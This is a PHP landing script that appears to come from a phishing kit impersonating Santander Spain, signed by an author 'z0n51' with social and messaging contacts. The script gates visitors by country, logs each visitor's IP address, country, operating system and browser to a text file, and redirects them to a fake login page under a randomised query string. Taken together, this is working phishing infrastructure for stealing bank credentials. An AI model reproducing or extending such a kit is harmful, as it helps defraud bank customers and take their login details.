<?php
$kings = rand(0,10000000000000);
$Man=date("D,M,d,Y-g:ia");

/**
 * @link              https://www.z0n51.com/
 * @since             20/02/2020
 * @package           SANTANDER ES
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      SANTANDER ES
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

include 'inc/app.php';
require 'autorize_country.php';
$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country($get_user_ip);
$get_user_countrycode = get_user_countrycode($get_user_ip);
$get_user_os          = get_user_os();
$get_user_browser     = get_user_browser();
    

header("location:./z0n51/login.php?signin=$kings+_TIme:$Man");
$file = fopen("vu.txt","a");
fwrite($file,$get_user_ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$get_user_country | $get_user_os | $get_user_browser] \n");

?>
    